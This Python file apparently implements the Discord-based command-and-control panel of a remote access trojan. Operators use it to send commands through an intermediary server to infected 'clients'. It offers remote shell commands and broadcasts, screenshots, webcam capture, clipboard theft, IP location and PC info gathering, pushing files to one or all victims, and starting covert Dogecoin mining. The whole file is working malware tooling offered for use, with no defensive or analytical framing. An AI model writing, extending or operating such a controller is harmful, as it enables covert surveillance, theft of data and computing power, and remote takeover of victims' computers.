import discord
from discord.ext import commands
from discord import app_commands
import requests
from dotenv import load_dotenv
import os

# Load environment variables from .env file
load_dotenv()

# Configuration
BOT_TOKEN = os.getenv('DISCORD_BOT_TOKEN')  # Retrieve bot token from .env file

INTERMEDIARY_SERVER_URL = 'https://nikdahakr.pythonanywhere.com'  # URL of the intermediary server

intents = discord.Intents.default()
bot = commands.Bot(command_prefix='!', intents=intents)

# Register the slash commands when the bot is ready
@bot.event
async def on_ready():
    try:
        await bot.tree.sync()  # Syncs the commands globally
        print(f'Synced slash commands successfully.')
    except Exception as e:
        print(f'Failed to sync commands: {e}')
    print(f'Bot {bot.user} is ready and connected!')

@bot.tree.command(name='shell', description='Send a command to a specific client')
@app_commands.describe(session_id='The session ID of the client', command='The command to send')
async def send_command(interaction: discord.Interaction, session_id: str, command: str):
    response = requests.post(f'{INTERMEDIARY_SERVER_URL}/send_command', json={"session_id": session_id, "command": command})
    await interaction.response.send_message(f"Command sent to {session_id} successfully. Result will be posted shortly.")

@bot.tree.command(name='broadcast', description='Broadcast a command to all clients')
@app_commands.describe(command='The command to broadcast')
async def broadcast_command(interaction: discord.Interaction, command: str):
    response = requests.post(f'{INTERMEDIARY_SERVER_URL}/broadcast_command', json={"command": command})
    await interaction.response.send_message(f"Broadcast command: {command} to all clients. Results will be posted shortly.")

@bot.tree.command(name='location', description='Get the location (IP address) of a specific client')
@app_commands.describe(session_id='The session ID of the client')
async def location(interaction: discord.Interaction, session_id: str):
    response = requests.post(f'{INTERMEDIARY_SERVER_URL}/send_command', json={"session_id": session_id, "command": 'location'})
    await interaction.response.send_message(f"Location command sent to {session_id} successfully. Result will be posted shortly.")

@bot.tree.command(name='screen', description='Take a screenshot from a specific client')
@app_commands.describe(session_id='The session ID of the client')
async def screen(interaction: discord.Interaction, session_id: str):
    response = requests.post(f'{INTERMEDIARY_SERVER_URL}/send_command', json={"session_id": session_id, "command": 'screen'})
    await interaction.response.send_message(f"Screenshot command sent to {session_id} successfully. Result will be posted shortly.")

@bot.tree.command(name='upload', description='Upload a file to a specific client')
@app_commands.describe(session_id='The session ID of the client', file='The file to upload')
async def upload(interaction: discord.Interaction, session_id: str, file: discord.Attachment):
    file_url = file.url
    file_name = file.filename
    response = requests.post(f'{INTERMEDIARY_SERVER_URL}/send_command', json={"session_id": session_id, "command": f'upload {file_url} {file_name}'})
    await interaction.response.send_message(f"Uploaded {file_name} to {session_id} successfully.")

@bot.tree.command(name='update', description='Update a file on all clients')
@app_commands.describe(file='The file to update on all clients')
async def update(interaction: discord.Interaction, file: discord.Attachment):
    file_url = file.url
    file_name = file.filename
    response = requests.post(f'{INTERMEDIARY_SERVER_URL}/broadcast_command', json={"command": f'upload {file_url} {file_name}'})
    await interaction.response.send_message(f"Updated {file_name} on all clients successfully.")



@bot.tree.command(name='webcam', description='Capture a webcam image from a specific client')
@app_commands.describe(session_id='The session ID of the client')
async def webcam(interaction: discord.Interaction, session_id: str):
    response = requests.post(f'{INTERMEDIARY_SERVER_URL}/send_command', json={"session_id": session_id, "command": 'webcam'})
    await interaction.response.send_message(f"Webcam command sent to {session_id} successfully. Result will be posted shortly.")

@bot.tree.command(name='get_clipboard', description='Get the clipboard content from a specific client')
@app_commands.describe(session_id='The session ID of the client')
async def get_clipboard(interaction: discord.Interaction, session_id: str):
    response = requests.post(f'{INTERMEDIARY_SERVER_URL}/send_command', json={"session_id": session_id, "command": 'get_clipboard'})
    await interaction.response.send_message(f"Clipboard command sent to {session_id} successfully. Result will be posted shortly.")

#mining
@bot.tree.command(name='start_mining', description='Start Dogecoin mining on a specific client')
@app_commands.describe(session_id='The session ID of the client')
async def start_mining_command(interaction: discord.Interaction, session_id: str):
    response = requests.post(f'{INTERMEDIARY_SERVER_URL}/send_command', json={"session_id": session_id, "command": 'start_mining'})
    await interaction.response.send_message(f"Mining start command sent to {session_id} successfully.")

@bot.tree.command(name='stop_mining', description='Stop Dogecoin mining on a specific client')
@app_commands.describe(session_id='The session ID of the client')
async def stop_mining_command(interaction: discord.Interaction, session_id: str):
    response = requests.post(f'{INTERMEDIARY_SERVER_URL}/send_command', json={"session_id": session_id, "command": 'stop_mining'})
    await interaction.response.send_message(f"Mining stop command sent to {session_id} successfully.")

@bot.tree.command(name='start_mining_all', description='Start Dogecoin mining on all clients')
async def start_mining_all_command(interaction: discord.Interaction):
    response = requests.post(f'{INTERMEDIARY_SERVER_URL}/broadcast_command', json={"command": 'start_mining_all'})
    await interaction.response.send_message(f"Broadcast mining start command to all clients successfully.")

@bot.tree.command(name='stop_mining_all', description='Stop Dogecoin mining on all clients')
async def stop_mining_all_command(interaction: discord.Interaction):
    response = requests.post(f'{INTERMEDIARY_SERVER_URL}/broadcast_command', json={"command": 'stop_mining_all'})
    await interaction.response.send_message("Broadcast mining stop command to all clients successfully.")



@bot.tree.command(name='pc_info', description='Get PC and network info from a specific client')
@app_commands.describe(session_id='The session ID of the client')
async def pc_info(interaction: discord.Interaction, session_id: str):
    response = requests.post(f'{INTERMEDIARY_SERVER_URL}/send_command', json={"session_id": session_id, "command": 'pc_info'})
    await interaction.response.send_message(f"PC info command sent to {session_id} successfully. Result will be posted shortly.")


if __name__ == "__main__":
    bot.run(BOT_TOKEN)
